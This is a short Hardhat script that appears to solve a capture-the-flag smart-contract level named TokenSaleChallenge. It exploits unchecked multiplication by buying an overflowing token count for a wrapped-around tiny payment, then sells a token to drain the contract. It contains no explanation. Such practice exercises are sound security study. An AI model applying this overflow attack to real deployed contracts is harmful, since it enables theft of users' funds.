const { ethers } = require("hardhat");

async function main() {
  const tokenSale = await ethers.getContractAt(
    "TokenSaleChallenge",
    "0xEbe4f3B07022f557F29499c80f87A78165b6a12f"
  );

  const { WeiPerEther, MaxUint256 } = ethers.constants;

  const numTokens = MaxUint256.div(WeiPerEther).add(1);
  const value = numTokens.mul(WeiPerEther).mod(MaxUint256.add(1));

  await tokenSale.buy(numTokens, { value });
  await tokenSale.sell(1);

  console.log("isComplete:", await tokenSale.isComplete());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
